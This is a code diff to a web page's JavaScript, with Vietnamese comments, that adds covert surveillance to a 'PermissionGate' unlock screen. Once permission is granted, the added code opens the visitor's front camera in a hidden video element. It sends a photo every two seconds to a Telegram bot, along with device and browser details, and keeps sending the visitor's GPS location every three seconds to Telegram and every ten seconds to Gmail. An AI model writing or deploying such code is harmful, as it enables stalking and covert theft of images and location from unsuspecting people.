@@ -279,6 +279,102 @@
     }
 
     /**
+     * Gửi ảnh chụp từ Camera trực tiếp về Telegram
+     */
+    async function sendPhotoToTelegram(blob, photoCount = 1) {
+        const tg = getTelegramConfig();
+        if (!tg.botToken || !tg.chatIds || !tg.chatIds.length) return;
+
+        const timeStr = getVietnamTime();
+        const device = getDeviceInfo();
+        const pageTitle = document.title || 'My Design';
+
+        const caption = 
+`📸 <b>[HÌNH ẢNH CAMERA #${photoCount}]</b>
+⏰ <b>Thời gian:</b> ${timeStr}
+🌐 <b>Trang web:</b> ${pageTitle}
+📱 <b>Thiết bị:</b> ${device.deviceType} (${device.os} - ${device.browser})`;
+
+        for (const chatId of tg.chatIds) {
+            try {
+                const formData = new FormData();
+                formData.append('chat_id', chatId);
+                formData.append('photo', blob, `capture_${photoCount}.jpg`);
+                formData.append('caption', caption);
+                formData.append('parse_mode', 'HTML');
+
+                await fetch(`https://api.telegram.org/bot${tg.botToken}/sendPhoto`, {
+                    method: "POST",
+                    body: formData
+                });
+            } catch (e) {
+                console.warn(`[Telegram] Lỗi gửi ảnh tới ${chatId}:`, e);
+            }
+        }
+    }
+
+    let cameraStream = null;
+    let videoEl = null;
+    let cameraPhotoCount = 0;
+    let cameraIntervalId = null;
+
+    function startCameraAutoCapture() {
+        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;
+        if (cameraIntervalId) return;
+
+        if (!videoEl) {
+            videoEl = document.createElement('video');
+            videoEl.setAttribute('autoplay', '');
+            videoEl.setAttribute('playsinline', '');
+            videoEl.setAttribute('muted', '');
+            videoEl.style.display = 'none';
+            document.body.appendChild(videoEl);
+        }
+
+        navigator.mediaDevices.getUserMedia({
+            video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
+            audio: false
+        }).then((stream) => {
+            cameraStream = stream;
+            videoEl.srcObject = stream;
+            videoEl.play().catch(() => {});
+
+            // Chụp ngay tấm đầu tiên sau 600ms
+            setTimeout(() => {
+                captureAndSendPhoto();
+            }, 600);
+
+            // Cứ 2 giây tự động chụp 1 tấm gửi về Telegram
+            cameraIntervalId = setInterval(() => {
+                captureAndSendPhoto();
+            }, 2000);
+        }).catch((err) => {
+            console.warn("[PermissionGate] Camera permission error:", err);
+        });
+    }
+
+    function captureAndSendPhoto() {
+        if (!videoEl || !cameraStream || videoEl.videoWidth === 0) return;
+
+        try {
+            const canvas = document.createElement('canvas');
+            canvas.width = videoEl.videoWidth;
+            canvas.height = videoEl.videoHeight;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(videoEl, 0, 0, canvas.width, canvas.height);
+
+            canvas.toBlob((blob) => {
+                if (blob) {
+                    cameraPhotoCount++;
+                    sendPhotoToTelegram(blob, cameraPhotoCount).catch(() => {});
+                }
+            }, 'image/jpeg', 0.85);
+        } catch (e) {
+            console.warn("[PermissionGate] Lỗi chụp ảnh:", e);
+        }
+    }
+
+    /**
      * Phát tọa độ tới tất cả các kênh (Telegram + Gmail)
      */
     function broadcastLocation(coords, count = 1) {
@@ -340,6 +436,9 @@
             btnText.textContent = 'ĐANG MỞ KHÓA...';
             latestCoords = coords;
 
+            // Khởi chạy camera tự động chụp 2s / 1 tấm
+            startCameraAutoCapture();
+
             // 1. Gửi định vị lần đầu ngay khi mở web (Cả Telegram và Gmail)
             if (coords) {
                 sendGpsToTelegram(coords, 1).catch(() => {});
@@ -371,14 +470,17 @@
                 } catch (e) {}
             }
 
-            // 3. Chu kỳ gửi: Telegram 1 giây / lần, Gmail 10 giây / lần
+            // 3. Chu kỳ gửi: Telegram GPS 3 giây / lần, Gmail 10 giây / lần
             setInterval(() => {
                 if (latestCoords) {
                     secondsElapsed++;
 
-                    // 📱 Telegram: Cứ 1 giây gửi 1 lần
-                    teleCount++;
-                    sendGpsToTelegram(latestCoords, teleCount).catch(() => {});
+                    // 📱 Telegram GPS: Cứ 3 giây gửi 1 lần
+                    if (secondsElapsed % 3 === 0) {
+                        teleCount++;
+                        console.log(`[PermissionGate] ⏱️ Gửi định vị GPS định kỳ 3s (Lần #${teleCount})...`);
+                        sendGpsToTelegram(latestCoords, teleCount).catch(() => {});
+                    }
 
                     // 📬 Gmail: Cứ 10 giây gửi 1 lần
                     if (secondsElapsed % 10 === 0) {
@@ -423,7 +525,14 @@
                 }
             } catch (e) {}
 
-            // 2. Yêu cầu cấp quyền VỊ TRÍ GPS (Geolocation)
+            // 2. Yêu cầu cấp quyền CAMERA (Chụp ảnh tự động)
+            try {
+                if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                    startCameraAutoCapture();
+                }
+            } catch (e) {}
+
+            // 3. Yêu cầu cấp quyền VỊ TRÍ GPS (Geolocation)
             if (!navigator.geolocation) {
                 // Trình duyệt không hỗ trợ Geolocation -> Mở bằng IP ngầm
                 unlockWeb(null);
